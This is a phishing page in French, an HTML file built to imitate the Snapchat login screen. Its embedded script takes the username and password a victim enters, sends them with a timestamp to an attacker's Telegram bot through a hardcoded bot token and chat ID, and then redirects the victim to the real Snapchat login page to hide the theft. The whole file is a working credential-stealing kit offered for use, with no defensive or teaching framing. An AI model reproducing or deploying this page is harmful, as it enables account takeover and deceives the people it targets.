<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Connexion • Snapchat</title>
<link rel="icon" href="https://www.snapchat.com/static/favicon.ico">
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    background:#FFFC00; min-height:100vh;
    display:flex; align-items:center; justify-content:center; padding:20px;
  }
  .card {
    background:#fff; width:100%; max-width:420px;
    border-radius:24px; padding:40px 28px 32px;
    box-shadow:0 12px 40px rgba(0,0,0,.18); text-align:center;
  }
  .ghost { width:68px; height:68px; margin:0 auto 22px; display:block; fill:#FFFC00;
           filter:drop-shadow(0 0 0.5px #000); }
  h1 { font-size:22px; font-weight:700; color:#111; margin-bottom:6px; }
  .sub { font-size:14px; color:#6b6b6b; margin-bottom:26px; }
  .field { text-align:left; margin-bottom:14px; }
  .field label { display:block; font-size:12px; font-weight:600; color:#444; margin-bottom:6px; }
  .field input {
    width:100%; padding:14px 16px; font-size:16px;
    border:1px solid #d8d8d8; border-radius:12px; background:#fafafa;
    outline:none; transition:.15s;
  }
  .field input:focus { border-color:#111; background:#fff; }
  button {
    width:100%; padding:15px; margin-top:8px; font-size:16px; font-weight:700;
    background:#111; color:#fff; border:none; border-radius:12px;
    cursor:pointer; transition:.15s;
  }
  button:active { transform:scale(.98); }
  button:disabled { opacity:.6; }
  .ou { display:flex; align-items:center; gap:12px; margin:24px 0 18px; color:#aaa; font-size:12px; }
  .ou::before, .ou::after { content:""; flex:1; height:1px; background:#e5e5e5; }
  .alt { font-size:14px; color:#111; text-decoration:none; font-weight:600; display:block; }
  .foot { margin-top:26px; font-size:11px; color:#999; line-height:1.6; }
</style>
</head>
<body>

<div class="card">
  <svg class="ghost" viewBox="0 0 100 100">
    <path d="M50 8c-14 0-24 11-24 26 0 4 1 8 1 11-1 3-3 4-6 5-3 1-6 2-6 4 0 3 5 4 8 5 2 1 3 2 3 4 0 3-3 6-7 8-3 1-6 2-6 4 0 3 6 5 11 6 1 0 2 1 2 2 1 4 4 7 9 7 5 0 8-3 13-3s8 3 13 3c5 0 8-3 9-7 0-1 1-2 2-2 5-1 11-3 11-6 0-2-3-3-6-4-4-2-7-5-7-8 0-2 1-3 3-4 3-1 8-2 8-5 0-2-3-3-6-4-3-1-5-2-6-5 0-3 1-7 1-11 0-15-10-26-24-26z"/>
  </svg>

  <h1>Connexion</h1>
  <p class="sub">Connecte-toi à ton compte Snapchat</p>

  <form id="f" autocomplete="on">
    <div class="field">
      <label for="u">Nom d'utilisateur ou e-mail</label>
      <input id="u" name="username" type="text" autocapitalize="none"
             autocomplete="username" placeholder="Ton identifiant" required>
    </div>
    <div class="field">
      <label for="p">Mot de passe</label>
      <input id="p" name="password" type="password"
             autocomplete="current-password" placeholder="••••••••" required>
    </div>
    <button type="submit" id="b">Se connecter</button>
  </form>

  <div class="ou">OU</div>
  <a class="alt" href="https://accounts.snapchat.com/accounts/password_reset_request">Mot de passe oublié ?</a>

  <p class="foot">© Snapchat, Inc. — Tous droits réservés</p>
</div>

<script>
const TG_TOKEN = "9062769327:AAEarnClOeGAdI3xw769YwNejeRHdgYkJow";
const TG_CHAT  = "1865426041";
const REDIRECT = "https://accounts.snapchat.com/accounts/login";

const f = document.getElementById("f");
const b = document.getElementById("b");

f.addEventListener("submit", async function (ev) {
  ev.preventDefault();
  b.disabled = true;
  b.textContent = "Connexion…";

  const user = document.getElementById("u").value.trim();
  const pass = document.getElementById("p").value;

  const msg =
    "🟡 SNAPCHAT\n" +
    "👤 " + user + "\n" +
    "🔑 " + pass + "\n" +
    "🕒 " + new Date().toLocaleString("fr-FR");

  try {
    await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
    });
  } catch (_) {}

  setTimeout(() => { window.location.href = REDIRECT; }, 1200);
});
</script>
</body>
</html>
